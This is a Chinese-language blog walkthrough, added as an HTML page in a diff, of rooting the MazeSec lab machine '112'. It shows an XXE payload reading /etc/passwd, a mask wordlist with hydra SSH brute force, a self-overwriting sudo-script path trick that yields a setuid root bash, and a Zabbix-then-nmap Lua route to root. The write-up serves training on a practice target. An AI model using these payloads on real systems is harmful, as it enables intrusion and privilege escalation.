@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - Maze-Sec 112</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>Maze-Sec 112</h1>
+    <p>
+        <span class="meta">发布于: 2026-01-17 22:35</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称：112<br />
+靶机作者：ll104567/群主<br />
+靶机类型：Linux<br />
+难度：low-hard<br />
+来源：MazeSec/QQ内部群 660930334<br />
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<h2>目标主机</h2>
+<p>使用 arp-scan 扫描内网存活主机：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~/test1]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.215   08:00:27:5c:0a:80       PCS Systemtechnik GmbH</code></pre>
+<p>目标主机 IP：192.168.1.10</p>
+<h2>端口扫描</h2>
+<p>使用 nmap 进行 TCP 全端口扫描：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap 192.168.1.10 -p- -sT -sV
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))</code></pre>
+<p>发现开放了 22/ssh、80/http 端口</p>
+<h2>80 端口服务探测</h2>
+<p>访问 80 端口，展示了一个 xml 解析的页面：</p>
+<p><img src="/images/maze-112/1.png" alt="" /></p>
+<p>尝试输入 xml 内容进行解析，测试是否存在 XXE 漏洞：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt; 
+&lt;!DOCTYPE foo [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+<p>页面存在 XXE 漏洞，成功读取 /etc/passwd 文件：</p>
+<p><img src="/images/maze-112/2.png" alt="" /></p>
+<p>可以看到存在登录 shell 的用户 tuf，以及 tuf 用户后的几个服务用户</p>
+<p>在 /etc/passwd 文件里，tuf 用户行存在注释 <code>KQNPHFqG**JHcYJossIe</code>，猜测可能是密码线索，两位掩码</p>
+<pre><code class="language-bash">tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash</code></pre>
+<h2>爆破 tuf 用户密码</h2>
+<p>使用 python 脚本生成所有可能的两位字母数字组合，爆破 tuf 用户密码：</p>
+<pre><code class="language-python"># file: bp.py
+import itertools
+import string
+
+def generate_passwords():
+    # 配置信息
+    base_pwd = "KQNPHFqG**JHcYJossIe"
+    output_file = "pass.txt"
+    # 字符集：a-z, A-Z, 0-9
+    charset = string.ascii_letters + string.digits     
+    # 计算所有 2 位组合 (62 * 62 = 3844)
+    combinations = itertools.product(charset, repeat=2)
+    print(f"正在生成密码并写入 {output_file}...")
+    try:
+        with open(output_file, "w", encoding="utf-8") as f:
+            count = 0
+            for combo in combinations:
+                # 拼接两个掩码字符
+                replacement = "".join(combo)
+                # 替换原始字符串中的 **
+                new_password = base_pwd.replace("**", replacement)
+                # 写入文件并换行
+                f.write(new_password + "\n")
+                count += 1
+        print(f"成功！已生成 {count} 个密码到 {output_file}。")
+    except Exception as e:
+        print(f"写入失败: {e}")
+if __name__ == "__main__":
+    generate_passwords()</code></pre>
+<p>使用 hydra 指定密码字典对 tuf 用户进行爆破：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ python3 bp.py 
+正在生成密码并写入 pass.txt...
+成功！已生成 3844 个密码到 pass.txt。
+
+┌──(npc㉿kali)-[~]
+└─$ hydra -l tuf -P pass.txt ssh://192.168.1.10 -e nsr</code></pre>
+<p><img src="/images/maze-112/3.png" alt="" /></p>
+<p>爆破出 tuf 用户密码为 <code>KQNPHFqG6mJHcYJossIe</code></p>
+<h2>sudo 提权</h2>
+<h2>方案一：ta0方案（路径解析利用）</h2>
+<h3>1.1、sudo 脚本分析</h3>
+<p>使用爆破出的密码登录 tuf 用户，tuf 用户可以 sudo 权限执行 /opt/112.sh </p>
+<p><img src="/images/maze-112/4.png" alt="" /></p>
+<p>脚本内容：</p>
+<pre><code class="language-bash">tuf@112:~$ cat /opt/112.sh 
+#!/bin/bash
+input_url=""
+output_file=""
+use_file=false
+regex='^https://maze-sec.com/[a-zA-Z0-9/]*$'
+while getopts ":u:o:" opt; do
+    case ${opt} in
+        u) input_url="$OPTARG" ;;
+        o) output_file="$OPTARG"; use_file=true ;;
+        \?) echo "错误: 无效选项 -$OPTARG"; exit 1 ;;
+        :) echo "错误: 选项 -$OPTARG 需要一个参数"; exit 1 ;;
+    esac
+done
+if [[ -z "$input_url" ]]; then
+    echo "错误: 必须使用 -u 参数提供URL"
+    exit 1
+fi
+if [[ ! "$input_url" =~ ^https://maze-sec.com/ ]]; then
+    echo "错误: URL必须以 https://maze-sec.com/ 开头"
+    exit 1
+fi
+if [[ ! "$input_url" =~ $regex ]]; then
+    echo "错误: URL包含非法字符，只允许字母、数字和斜杠"
+    exit 1
+fi
+if (( RANDOM % 2 )); then
+    result="$input_url is a good url."
+else
+    result="$input_url is not a good url."
+fi
+if [ "$use_file" = true ]; then
+    echo "$result" &gt; "$output_file"
+    echo "结果已保存到: $output_file"
+else
+    echo "$result"
+fi</code></pre>
+<p>通过注释或分析脚本可以知道脚本的功能：接受一个 URL 参数 <code>-u</code>，并判断 URL 是否符合要求，然后输出随机结果，若指定了 <code>-o</code> 参数则将结果写入文件，url 部分可控，任意文件覆盖。</p>
+<h3>1.2、前置内容补充</h3>
+<p>补充一些过渡内容：</p>
+<ul>
+<li>1、unix 路径中如果存在多个 <code>/</code> 等价于单个 <code>/</code>，例如 <code>/opt//112.sh</code> 等价于 <code>/opt/112.sh</code>。</li>
+<li>2、在 Linux 中，目录名和文件名几乎可以使用任何字符（除了 <code>/</code> 和 null 字符），包括空格、制表符、换行符以及其他特殊字符都是允许的。</li>
+<li>3、当 sudo/ shell 尝试执行一个无 shebang 的可执行文本文件时，底层 execve 返回ENOEXEC，调用方通常会退回用 /bin/sh（或其指定的 shell）来解释执行该文件。</li>
+</ul>
+<p>这里在引出 ta0 方案：</p>
+<p>如果命令名包含 /，shell 会将其视为路径（绝对或相对）直接执行，而不会在 $PATH 中查找；若为相对路径，则以当前工作目录为基准解析。</p>
+<p>核心原理：</p>
+<p>这个脚本的 -o 参数允许我们将验证结果（如 <a href="https://maze-sec.com/111">https://maze-sec.com/111</a> is a good url.）写入任意文件。</p>
+<ul>
+<li>1、如果我们利用这一特性，将结果覆盖脚本自身（/opt/112.sh），旧的脚本内容（包括 #!/bin/bash）就会丢失。</li>
+<li>2、当我们再次 sudo 执行该脚本时，Shell 读取到的第一行代码变成了以 https:// 开头的字符串。</li>
+<li>3、由于该字符串包含 /，Shell 会将其视为相对路径命令执行，即尝试在当前目录下寻找 https: 文件夹下的 maze-sec.com 文件夹下的 111 可执行文件。</li>
+<li>4、只要我们提前在当前目录构建好这个文件夹结构并放入恶意文件，即可实现 Root 权限命令执行。</li>
+</ul>
+<h3>1.3、路径解析利用</h3>
+<p>例如下面，这里就是一个相对路径，<code>https://maze-sec.com/111</code> 会被解析为当前目录下的 <code>https:/maze-sec.com/111</code> 文件并执行，后面的 <code>is a good url.</code> 会被当作参数传递给该脚本：</p>
+<pre><code class="language-bash">https://maze-sec.com/111 is a good url.</code></pre>
+<p>测试：</p>
+<pre><code class="language-bash">tuf@112:~$ echo 'https://maze-sec.com/111 is a good url.' &gt; test.sh
+tuf@112:~$ chmod +x test.sh 
+tuf@112:~$ ./test.sh 
+./test.sh: line 1: https://maze-sec.com/111: No such file or directory
+tuf@112:~$ mkdir -p 'https://maze-sec.com/'
+tuf@112:~$ echo 'whoami' &gt; https\:/maze-sec.com/111
+tuf@112:~$ chmod +x https\:/maze-sec.com/111 
+tuf@112:~$ ./test.sh 
+tuf</code></pre>
+<p><img src="/images/maze-112/5.png" alt="" /></p>
+<p>成功执行了 <a href="https://maze-sec.com/111">https://maze-sec.com/111</a> 脚本，输出 tuf 用户名</p>
+<p>如果把 <code>https://maze-sec.com/111 is a good url.</code> 输出覆盖 /opt/112.sh 脚本，再用 sudo 执行，通过修改 111 文件内容就可以实现任意命令执行。</p>
+<pre><code class="language-bash">tuf@112:~$ sudo /opt/112.sh -o /opt/112.sh -u https://maze-sec.com/111
+结果已保存到: /opt/112.sh
+tuf@112:~$ cat /opt/112.sh 
+https://maze-sec.com/111 is a good url.
+tuf@112:~$ sudo /opt/112.sh 
+root
+tuf@112:~$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' &gt; https\:/maze-sec.com/111 
+tuf@112:~$ sudo /opt/112.sh 
+tuf@112:~$ ls -alh /tmp/bash
+-rwsr-sr-x 1 root root 1.2M Jan 16 11:37 /tmp/bash
+tuf@112:~$ /tmp/bash -p
+bash-5.0# id
+uid=1000(tuf) gid=1000(tuf) euid=0(root) egid=0(root) groups=0(root),1000(tuf)
+bash-5.0# </code></pre>
+<p><img src="/images/maze-112/6.png" alt="" /></p>
+<h2>方案二：毛坯房方案</h2>
+<p>毛坯房方案：靶机作者构建了预期提权利用链，靶机部署环节部分留空，需要选手自行补全实现漏洞环境利用。</p>
+<p>在 sudoers.d 目录下，有 sudo 授权配置文件 zabbix 且可读</p>
+<p><img src="/images/maze-112/7.png" alt="" /></p>
+<pre><code class="language-bash">tuf@112:~$ cat /etc/sudoers.d/zabbix 
+zabbix ALL = (ALL) NOPASSWD: /usr/bin/nmap -O *</code></pre>
+<p>zabbix 用户可以无密码 sudo 执行 nmap 的 -O 参数进行操作系统探测功能。</p>
+<p>那么提权问题就变成了如何上线 zabbix 用户的问题，在进程里也没有看到 zabbix 相关服务。</p>
+<p><a href="https://www.zabbix.com/documentation/7.0/zh/manual/installation">zabbix 官方文档 - 安装</a></p>
+<p><img src="/images/maze-112/8.png" alt="" /></p>
+<h2>2.1、环境补充与 Web 部署</h2>
+<p>检查靶机是否注册了 zabbix 服务，zabbix 服务启动失败</p>
+<p><img src="/images/maze-112/9.png" alt="" /></p>
+<p>收集靶机 zabbix 服务相关信息</p>
+<p><img src="/images/maze-112/10.png" alt="" /></p>
+<pre><code class="language-ini">DBHost=localhost
+DBName=zabbix
+DBUser=zabbix
+DBPassword=your_strong_password</code></pre>
+<p>zabbix 配置文件内的 mysql 密码正确，数据库为空</p>
+<p><img src="/images/maze-112/11.png" alt="" /></p>
+<p>查看 zabbix 配置文件里的 日志文件内容</p>
+<p><img src="/images/maze-112/12.png" alt="" /></p>
+<p>可以确定zabbix-server 已安装并尝试启动，但日志提示 zabbix.users 表不存在并判定 “database is not a Zabbix database”，说明数据库未导入 Zabbix 初始化 schema/data，导致服务端无法运行</p>
+<p>另外还可以知道 zabbix-server 版本<code>Zabbix 5.0.8 (revision d3c78f993a)</code></p>
+<pre><code class="language-plaintext">5297:20260108:061706.794 [Z3005] query failed: [1146] Table 'zabbix.users' doesn't exist [select userid from users limit 1]
+5297:20260108:061706.794 cannot use database "zabbix": database is not a Zabbix database</code></pre>
+<p>找到 zabbix-server 5.0.8 版本的初始化数据库文件，使用 zcat 命令直接把 .gz 压缩文件解压后输出到标准输出，再通过管道传递给 mysql 命令导入到 zabbix 数据库中：</p>
+<pre><code class="language-bash"># 重新构建数据库
+mysql -u zabbix -p'your_strong_password' -e "DROP DATABASE zabbix; CREATE DATABASE zabbix CHARACTER SET utf8 COLLATE utf8_bin;"
+#导入数据库
+zcat /usr/share/zabbix-server-mysql/{schema,images,data}.sql.gz | mysql -u zabbix -p'your_strong_password' zabbix</code></pre>
+<p>导入后，重启靶机，观察 zabbix 服务状态</p>
+<p><img src="/images/maze-112/13.png" alt="" /></p>
+<p>部署一个 zabbix web 前端页面，可以通过默认的用户名密码 <code>Admin:zabbix</code> 登录进入后台添加反弹shell命令</p>
+<p>Google 找到 zabbix 5.0.8 版本的源码包</p>
+<p><img src="/images/maze-112/14.png" alt="" /></p>
+<p><a href="https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz">https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz</a></p>
+<p>下载源码包到靶机 /tmp 目录，解压后进入 web ui 目录</p>
+<pre><code class="language-bash">cd /tmp
+wget https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz
+tar -xvf zabbix-5.0.8.tar.gz
+cd zabbix-5.0.8/ui/
+php -S 0.0.0.0:8000</code></pre>
+<p>访问靶机 8000 端口，进入 zabbix 部署页面，检查环境依赖遇到很多问题，有些要求php.ini配置修改，有些要求php模块安装</p>
+<p><img src="/images/maze-112/16.png" alt="" /></p>
+<p>再次启动，缺少 php-bcmath 模块</p>
+<pre><code class="language-bash">php -S 0.0.0.0:8000 -d post_max_size=16M -d max_execution_time=300 -d max_input_time=300 -d memory_limit=128M -d extension=bcmath -d extension=gd -d extension=mbstring -d extension=xmlreader -d extension=xmlwriter</code></pre>
+<p><img src="/images/maze-112/17.png" alt="" /></p>
+<h3>2.2、静态编译 php-cli 解决依赖问题</h3>
+<p>发现个好玩的Github项目 <code>static-php-cli</code>，可以很好地解决这个问题 <a href="https://github.com/crazywhalecc/static-php-cli">https://github.com/crazywhalecc/static-php-cli</a></p>
+<p>可以自己编译一个静态编译的 php-cli，或者直接下载别人编译好的版本</p>
+<p><img src="/images/maze-112/18.png" alt="" /></p>
+<p>这里提供了已经编译好的静态php文件</p>
+<p><a href="https://dl.static-php.dev/static-php-cli/bulk/">https://dl.static-php.dev/static-php-cli/bulk/</a></p>
+<p><img src="/images/maze-112/19.png" alt="" /></p>
+<pre><code class="language-bash">wget https://dl.static-php.dev/static-php-cli/bulk/php-8.0.30-cli-linux-x86_64.tar.gz
+tar -xvf php-8.0.30-cli-linux-x86_64.tar.gz
+./php -m</code></pre>
+<p>已经有了 bcmath 模块，把这个静态编译的 php-cli 上传到靶机，使用这个 php-cli 启动 zabbix web ui</p>
+<p><img src="/images/maze-112/20.png" alt="" /></p>
+<p>在 cli 启动时，直接指定 php.ini 配置参数，解决之前遇到的各种对 php.ini 的配置问题</p>
+<pre><code class="language-bash">/tmp/php -S 0.0.0.0:8000 \
+-d date.timezone=Asia/Shanghai \
+-d post_max_size=16M \
+-d max_execution_time=300 \
+-d max_input_time=300 \
+-d display_errors=Off \
+-t /tmp/zabbix-5.0.8/ui</code></pre>
+<p>正常部署</p>
+<p><img src="/images/maze-112/21.png" alt="" /></p>
+<p>在官网可以拿到默认用户名密码<a href="https://www.zabbix.com/documentation/7.0/zh/manual/quickstart/login">https://www.zabbix.com/documentation/7.0/zh/manual/quickstart/login</a></p>
+<p><img src="/images/maze-112/23.png" alt="" /></p>
+<p><img src="/images/maze-112/22.png" alt="" /></p>
+<h3>2.3、zabbix 提权</h3>
+<p>在 zabbix 后台添加一个 反弹 shell 脚本</p>
+<p><img src="/images/maze-112/24.png" alt="" /></p>
+<p><img src="/images/maze-112/25.png" alt="" /></p>
+<p>在主机监控处触发反弹shell脚本</p>
+<p><img src="/images/maze-112/26.png" alt="" /></p>
+<p><img src="/images/maze-112/27.png" alt="" /></p>
+<p>zabbix 用户可以 sudo 执行 nmap -O 参数，-O: Enable OS detection 用来启用操作系统探测功能，后面通配符部分可以随意发挥</p>
+<p>Gtfobins 找 nmap 提权，nmap可以执行lua脚本，利用 lua 脚本执行任意命令</p>
+<p><img src="/images/maze-112/28.png" alt="" /></p>
+<pre><code class="language-bash">echo 'os.execute("/bin/bash -p")' &gt; /tmp/exp.lua
+sudo nmap -O 127.0.0.1 --script=/tmp/exp.lua</code></pre>
+<p><img src="/images/maze-112/29.png" alt="" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>渗透</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#ta0</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
